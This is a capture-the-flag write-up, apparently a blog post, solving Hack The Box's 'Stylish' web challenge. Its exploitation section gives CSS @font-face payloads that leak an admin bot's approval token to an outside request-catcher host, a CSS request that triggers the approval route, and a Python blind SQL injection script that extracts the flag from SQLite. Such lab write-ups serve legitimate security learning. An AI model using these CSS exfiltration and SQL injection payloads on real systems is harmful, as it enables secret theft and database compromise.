---
layout: post
title:  "Saturn"
date:   2025-03-18 12:32:45 +0100
permalink: /hackthebox/stylish/
---


# HTB - Stylish

---
> Author: Nauten
> Published: April 24, 2025
> Description: A new card generator platform just went live. Apparently everything seems to be good but is it really like this? Find your way in with style!

---

<br>

In this challenge, we are given the source code and the index page allow us to enter css code for admin to review. There are nothing much we can do more in the index page so let's jump in the source code.

![image.png](/assets/images/stylish/image1.png)

![image.png](/assets/images/stylish/image2.png)

![image.png](/assets/images/stylish/image3.png)

<br>


Looking through the source code, the flag was store in the file `database.js` and was inserted in a table started with flag and followed by 4 random hexadecimal characters. We could figure out this involves with SQL Injection. 

<br>

```javascript

const flagTable = 'flag_' + crypto.randomBytes(4).toString('hex');
 DROP TABLE IF EXISTS ${flagTable};
            CREATE TABLE IF NOT EXISTS ${flagTable} (
                flag          VARCHAR(255) NOT NULL
            );
            
            INSERT INTO ${flagTable} VALUES ('HTB{f4k3_fl4g_f0r_t3st1ng}');

```
<br>

At the same file, all the queries are used prepare statement except for one query `getSubmissionComments` that directly concatenating 2 parameter `submissionID` and `pagination`. Let's see where does this query called

<br>

```javascript

async getSubmissionComments(submissionID, pagination=10) {
		return new Promise(async (resolve, reject) => {
			try {
                const stmt = `SELECT content FROM comments WHERE id_submission = ${submissionID} LIMIT ${pagination}`;
                resolve(await this.db.all(stmt));
			} catch(e) {
				reject(e);
			}
		});
	}

```

<br>

The query is called in the `index.js` file in the `routes` folder. Moreover, the 2 parameters was concatenated was also coming from user that we can control. However, we cannot post a comment until our submission is reviewed and accepted by admin which is a bot here. 

<br>

```javascript

router.post('/api/comment/entries', async (req, res) => {
    const { submissionID, pagination } = req.body;

    if(submissionID && pagination) {
        return db.getSubmission(submissionID)
        .then(submission => {
            if (submission === undefined) return res.status(404).send(response('Submission does not exist!'));
            
            if(submission.approved == 0)
                return res.status(403).send(response('This submission has not been reviewed yet'));

                return db.getSubmissionComments(submissionID, pagination)
				.then(comments => {
					res.send(comments);
				})
        })
        .catch(() => res.status(500).send(response('Something went wrong!')));
    }
});

```

<br>

Looking at the logic again, when we post a submission, it is then inserted into the database but the post will never be approved since the `approved` value always set to 0. However, there seems to be a way we can trick the bot into accepting our submission. But how can we do that?


<br>

```javascript

async insertSubmission(css) {
		return new Promise(async (resolve, reject) => {
			try {
				let stmt = await this.db.prepare('INSERT INTO submissions (css, approved) VALUES (?, 0)');
                resolve((await stmt.run(css).then((result) => { return result.lastID; })));
			} catch(e) {
				reject(e);
			}
		});
	}

```

<br>

In order to make our submission accepted, we have to make the request to `/approve/:id/:approvalToken` route using the `id` of our submission and valid `approvalToken`. 


<br>

```javascript
router.get('/approve/:id/:approvalToken', (req, res) => {
    if(isAdmin(req) == 0)
        return res.status(403).send(response('Only admin can access this function!'));
    
    return db.getSubmission(req.params.id)
        .then(submission => {
            if (submission === undefined) return res.status(404).send(response('Submission does not exist!'));

            if(process.env.approvalToken == req.params.approvalToken) {
                return db.updateSubmissionStatus(submission.id, 1)
                    .then(()  => {
                        return res.send(response('Submission has been approved!'));
                    })
            }
            else {
                return res.status(403).send(response('Token doesn\'t match!'));
            }
        })
        .catch(() => res.status(500).send(response('Something went wrong!')));
});

```
<br>


The approval token is hidden inside the file `card_unapproved.html`. However, both route and html file was limited to local host only. 

This is when we utilize the bot. Since the bot runs from localhost, we can trick it to get the token and also make a request to `/approve/:id/:approvalToken` to make our submission accepted



<br>

```html

<div class="form-group">
                            <p id="approvalToken" class="d-none">{{ approvalToken }}</p>
                            <p id="rejectToken" class="d-none">{{ rejectToken }}</p>
                            <a id="approveBtn" data-id="{{ submissionID }}" class="btn btn-primary" role="button">Approve submission</a>
                            <a id="rejectBtn" data-id="{{ submissionID }}" class="btn btn-danger" role="button">Reject submission</a>
                            <div id="responseMsg"></div>                                                
</div>


```
<br>


As you can see in the `/api/submission/submit` route, our css content was put into a css file and the bot will visit the link that contains our css. 

While reseraching about css injection, I encounted this [BLOG](https://news.ycombinator.com/item?id=10490960). In short, it allow attacker to extract sensitive text from a web page by using CSS exfiltration attacks. By using this technique, we can extract the approve token. Furthermore, there was a misconfig in `font-src` directive in `Content Security Policy (CSP)`. It allows us to loading font from any origins. 


<br>


```javascript
router.post('/api/submission/submit', async (req, res) => {
    const { customCSS } = req.body;

    if(customCSS) {
        return db.insertSubmission(customCSS)
            .then(submissionID => {
                fs.writeFile(`card_styles/${submissionID}.css`, customCSS, function (err) {
                    if (err) return console.log(err);
                });
                bot.visitURL(`http://127.0.0.1:1337/view/${submissionID}`);
                
                return res.send(response(
                    `Your submission (Number ${submissionID}) successfully sent!<br>When approved it will become available <a href="/view/${submissionID}">here</a>`
                ));
            });
    }
    return res.status(403).send(response('CSS code field cannot be empty!'));
});
```
<br>



![image.png](/assets/images/stylish/image4.png)


![image.png](/assets/images/stylish/image5.png)
<br>

Last but not least. Our token is 32 characters and was sort in ASCII order

<br>

```javascript

module.exports = {
	generateToken() {
		const dict = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
		const shuffle = v=>[...v].sort(_=>Math.random()-.5).join('');

		// Shuffle characters and sort them in ASCII order
		return shuffle(dict).substring(0, 32).split('').sort().join('');
	}
}

```

<br>

## Exploitation

Since the approval token is made up of letters (a–z, A–Z) and numbers (0–9), we can try to leak each character by using CSS `@font-face` rules.

Here’s how it works:

For each possible character (a–z, A–Z, 0–9), we create a separate `@font-face` rule.

Each `@font-face` has a unicode-range for just one character, and the font file is hosted on a URL that we control.

If the approval token contains that character, the browser will try to load that font — and when it does, we get a request to our server, letting us know that character is part of the token.

For example, this rule targets the lowercase letter 'a'. If the approval contains letter 'a', we get a get request with parameter 'a'. Also, we have to make the approvalToken is not hidden since it hidden from the start. 
```css
@font-face {
  font-family: 'poc';
  src: url('https://tri123.free.beeceptor.com/?a');
  unicode-range: U+0061; /* 'a' */
}
...
#approvalToken {
    display: block !important;
    font-family: 'poc';
  }

```
<br>

![image.png](/assets/images/stylish/image6.png)

<br>
We sort it in ASCII order then use the same trick to send the get request to the route that approve our token

<br>

![image.png](/assets/images/stylish/image7.png)

<br>

```css

@font-face {
    font-family: 'poc';
    src: url('http://localhost:1337/approve/1/123458DEGIKNOQRVWYdefghmopqtuvwx');
  }

.card-body{
    font-family: 'poc'
}

```
<br>

![image.png](/assets/images/stylish/image8.png)

<br>

Since we finally come to the comment section, the rest of the SQL injection should be easy.

<br>

![image.png](/assets/images/stylish/image9.png)

<br>

```python
import requests
import string



char = 'a?bcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{-_}[]!@#$%^&*()_+|~`'

url = "http://localhost:1337/api/comment/entries"

flag = '';
for i in range(1, 100):
    found = False
    for c in char:
        payload =f"(CASE WHEN (SELECT hex(substr(tbl_name,{i},1)) = HEX('{c}') FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 2,1) THEN 1 ELSE 0 END)"
        payload = f"(CASE WHEN (SELECT hex(substr(flag,{i},1)) = HEX('{c}') FROM flag_ab4540db LIMIT 1) THEN 1 ELSE 0 END)"
        data  = {
            "submissionID":1,
            "pagination": payload
        }    
        response = requests.post(url, json=data)
        
        if len(response.text) > 5:
            flag += c
            print(f"Flag so far: {flag}")
            found = True
            break

    if not found:
        print(f"[+] End of table name reached at position {i}")
        break  # If no character was found at this position, stop the loop


    

```